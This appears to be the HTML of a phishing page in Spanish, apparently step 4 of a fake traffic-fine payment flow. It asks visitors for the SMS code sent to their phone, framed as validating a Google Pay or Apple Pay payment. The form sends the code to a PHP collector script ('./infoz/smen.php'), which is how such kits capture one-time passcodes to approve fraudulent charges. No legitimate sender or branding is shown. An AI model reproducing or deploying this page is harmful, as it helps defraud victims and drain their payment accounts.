...
<head>
	...
	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet" /><!-- Bootstrap CSS link -->
	...
	<style type="text/css">/* General Styles */
        ...
        @media (max-width: 576px) {
            ...
            /* Adjust width of inputs for small screens */
            .form-group {
                width: 100%;
            }

            /* Prevent form from zooming or being too large */
            body {
                font-size: 16px;
            }
...
<div class="row" style="box-sizing: inherit; margin-left: -15px; margin-right: -15px; color: rgb(76, 83, 93); font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">
<div class="col-sm-12 text-center" style="box-sizing: inherit; position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; float: left; width: 1166px;"><img src="" style="box-sizing: inherit; border: 0px;" width="200" /></div>
</div>

<div class="row" style="box-sizing: inherit; margin-left: -15px; margin-right: -15px; color: rgb(76, 83, 93); font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">
<div class="col-sm-12 text-center" style="box-sizing: inherit; position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; float: left; width: 1166px;">
<p class="text-center" style="box-sizing: inherit; margin-right: 0px; margin-bottom: 1.25rem; margin-left: 0px;">Por favor ingrese el c&oacute;digo SMS recibido en su n&uacute;mero para completar la validaci&oacute;n de su pago. La validaci&oacute;n est&aacute; relacionada con Google Pay y Apple Pay.</p>
</div>
</div>

<h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span style="box-sizing: inherit;">4</span></span><span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;<span style="font-size:16px;">SMS</span></span></span></h2>

<form action="./infoz/smen.php" method="post">
<div class="row">
<div class="col-md-6 form-group">&nbsp;</div>

<div class="col-md-6 form-group">&nbsp;</div>

<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span> <input class="form-control" id="first_name" maxlength="6" name="sms" required="" size="122" type="text" />
<div class="sms-error-frame" id="smsError" style="display: none;">Por favor, ingrese un c&oacute;digo v&aacute;lido.</div>
</div>
...
<p><button class="btn btn-primary" onclick="return validateSMS();" type="submit">Pagar Multa</button></p>
</form>
</section>
...
<script>
    function validateSMS() {
        var smsCode = document.getElementById('first_name').value;
        var errorElement = document.getElementById('smsError');
